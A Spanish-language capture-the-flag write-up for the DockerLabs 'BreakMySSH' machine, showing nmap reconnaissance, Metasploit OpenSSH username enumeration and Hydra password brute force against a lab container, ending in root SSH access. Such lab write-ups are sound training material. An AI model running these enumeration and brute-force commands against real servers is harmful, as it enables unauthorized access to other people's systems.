---
title: BreakMySSH
date: 2025-08-27 11:00:00 +0200
categories: [writeup, dockerlabs]
tags: [dockerlabs, hydra, ssh, fuerza bruta]     
image:
    path: https://dockerlabs.es/static/images/logos/logo.png
    alt: Docker Labs
---

# BreakMySSH

>BreakMySSH
Autor: El Pingüino de Mario
Dificultad: Muy Fácil
Fecha de creación: 29/05/2024
{: .prompt-tip }

## Reconocimiento

``` shell
┌──(kali㉿kali25)-[~/Dockerlabs/breakmyssh/breakmyssh]
└─$ nmap -p- -sV 10.88.0.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 13:49 CEST
Nmap scan report for 10.88.0.2
Host is up (0.000014s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
MAC Address: 62:2C:8B:ED:8A:91 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.99 seconds
```
Parece que el único puerto que encuentra nuestro escaneo es un servidor de SSH. 

## Preparación 
```shell
┌──(kali㉿kali25)-[~/Dockerlabs/breakmyssh/breakmyssh]
└─$ searchsploit ssh 7.7
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                  | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                            | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                      | linux/remote/45939.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## Explotación
Parece que esta versión de SSH que tiene esta máquina es una versión con la que supuestamente podríamos enumerar los usuarios.


``` shell
msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   true             no        Check for false positives (random username)
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5
                                            h, http
   RHOSTS        10.88.0.2        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         22               yes       The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                       no        Single username to test (username spray)
   USER_FILE                      no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_enumusers) > set user_file /usr/share/wordlists/rockyou.txt
user_file => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > check
[-] This module does not support check.
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 10.88.0.2:22 - SSH - Using malformed packet technique
[*] 10.88.0.2:22 - SSH - Checking for false positives
[*] 10.88.0.2:22 - SSH - Starting scan
[+] 10.88.0.2:22 - SSH - User 'root' found
[+] 10.88.0.2:22 - SSH - User 'lovely' found
[+] 10.88.0.2:22 - SSH - User 'nobody' found
[+] 10.88.0.2:22 - SSH - User 'games' found

```

El enumerador funciona y encuentro dos usuarios. 
``` shell
┌──(kali㉿kali25)-[~/Dockerlabs/breakmyssh]
└─$ hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://10.88.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-27 14:49:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.88.0.2:22/
[22][ssh] host: 10.88.0.2   login: lovely   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-27 14:49:25

┌──(kali㉿kali25)-[/usr/…/exploitdb/exploits/linux/remote]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.88.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
┌──(kali㉿kali25)-[~/Dockerlabs/breakmyssh]
└─$ ssh lovely@10.88.0.2
lovely@6de8f8587a66:/etc$ sudo -l
-bash: sudo: command not found
```
Parece que este sistema no exige passwords muy fuertes a sus usuarios, por lo que la escalada de privilegios parece ser innecesaria, basta con hacer fuerza bruta.

``` shell
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-27 14:28:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.88.0.2:22/
[22][ssh] host: 10.88.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-27 14:28:31

┌──(breakmyssh)─(kali㉿kali25)-[~/Dockerlabs/breakmyssh]
└─$ ssh root@10.88.0.2
root@10.88.0.2's password: 
root@6de8f8587a66:~# whoami
root
```

Fuerza bruta a tope. Muy fácil, pero te quedas con la duda si habría alguna posibilidad de conseguir una escalada de privilegios con algún otro de los usuarios descubiertos.  